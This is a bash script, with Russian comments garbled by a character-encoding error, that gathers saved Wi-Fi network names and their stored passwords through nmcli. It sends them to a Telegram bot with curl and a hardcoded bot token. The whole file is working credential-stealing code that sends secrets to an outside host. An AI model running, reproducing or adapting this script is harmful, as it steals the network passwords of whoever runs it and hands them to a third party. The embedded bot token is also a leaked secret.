#!/usr/bin/env bash
#
# –°–∫—Ä–∏–ø—Ç –¥–ª—è —Å–±–æ—Ä–∞ —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö Wi-Fi –ø–∞—Ä–æ–ª–µ–π –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∏—Ö –≤ Telegram
# –ù–µ —Ç—Ä–µ–±—É–µ—Ç sudo (–µ—Å–ª–∏ nmcli –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—É—á–∏—Ç—å psk –±–µ–∑ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
#
# –ü–µ—Ä–µ–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∑–∞–º–µ–Ω–∏—Ç–µ BOT_TOKEN –∏ CHAT_ID –Ω–∞ —Å–≤–æ–∏ –∑–Ω–∞—á–µ–Ω–∏—è.

BOT_TOKEN=7814937403:AAHDEMbf4ewt0O-RT-YsH31MUIA26W0GJw8
CHAT_ID=http://t.me/RecVVive_Bot

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
send_to_telegram() {
    local text="$1"
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        -d parse_mode="Markdown" \
        -d text="${text}" >/dev/null
}

# –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç—É–ø–µ–Ω –ª–∏ nmcli –¥–ª—è –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
if ! command -v nmcli >/dev/null 2>&1; then
    send_to_telegram "‚ùå nmcli –Ω–µ –Ω–∞–π–¥–µ–Ω. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ NetworkManager —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω."
    exit 1
fi

# –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ñ–∏–ª–µ–π Wi-Fi (—Å —Ç–∏–ø–æ–º 802-11-wireless)
mapfile -t SSIDS < <(nmcli -t -f NAME,TYPE connection show | awk -F: '$2=="802-11-wireless" { print $1 }')

if [ "${#SSIDS[@]}" -eq 0 ]; then
    send_to_telegram "‚ö†Ô∏è –ù–µ –Ω–∞–π–¥–µ–Ω–æ —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö Wi-Fi —Å–µ—Ç–µ–π."
    exit 0
fi

# –°–æ–±–∏—Ä–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
MESSAGE="üì° *–°–ø–∏—Å–æ–∫ Wi-Fi –∏ –ø–∞—Ä–æ–ª–µ–π:*\n\n"

for SSID in "${SSIDS[@]}"; do
    # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª—å (psk). nmcli –≤–µ—Ä–Ω—ë—Ç –µ–≥–æ –±–µ–∑ sudo, –µ—Å–ª–∏ –µ—Å—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ.
    PWD=$(nmcli -s -g 802-11-wireless-security.psk connection show "$SSID" 2>/dev/null)
    if [ -z "$PWD" ]; then
        MESSAGE+="‚Ä¢ *${SSID}* ‚Äî _–ø–∞—Ä–æ–ª—å –Ω–µ –ø–æ–ª—É—á–µ–Ω_\n"
    else
        MESSAGE+="‚Ä¢ *${SSID}* ‚Äî \`${PWD}\`\n"
    fi
done

# –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
send_to_telegram "$MESSAGE"
